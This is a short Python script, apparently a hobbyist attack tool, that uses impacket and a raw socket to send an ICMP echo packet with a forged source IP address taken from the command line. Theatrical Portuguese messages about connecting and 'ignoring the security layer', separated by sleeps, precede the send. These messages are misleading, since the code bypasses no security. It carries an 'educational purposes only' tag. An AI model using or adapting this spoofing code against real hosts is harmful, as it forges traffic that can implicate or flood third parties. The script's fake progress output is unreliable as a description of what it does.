import socket,sys
from impacket import ImpactDecoder, ImpactPacket
import os
import time
def main():
    
    src = sys.argv[1]
    dst = sys.argv[2]
    
    
    ip = ImpactPacket.IP()
    ip.set_ip_src(src)
    ip.set_ip_dst(dst)
    
    
    icmp = ImpactPacket.ICMP()
    icmp.set_icmp_type(icmp.ICMP_ECHO)
    

    icmp.contains(ImpactPacket.Data("a"*100))
    ip.contains(icmp)

    os.system("figlet TKCR-SPOOFING-IP")
    print ("\033[92m")
    print ("________________TENTANDO ALCANÇAR O SERVER_____________________")
    time.sleep(5)
    print ("_________________ESTABELECENDO CONEXÕES_______________________")
    time.sleep(5)
    print ("_________0100100 IGNORANDO A CAMADA DE SEGURANÇA 001010_______________")
    time.sleep(5)
    print ("_________________CONEXÕES ESTABELECIDAS________________________")
    time.sleep(5)
    print ("    ATAQUE SPOOFING INICIADO. NOTA: APENAS PARA FINS EDUCACIONAIS")
    time.sleep(3)

    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    

    icmp.set_icmp_id(1)
    icmp.set_icmp_cksum(0)
    icmp.auto_checksum = 0
    s.sendto(ip.get_packet(), (dst, 0))

if __name__ == "__main__":
    main()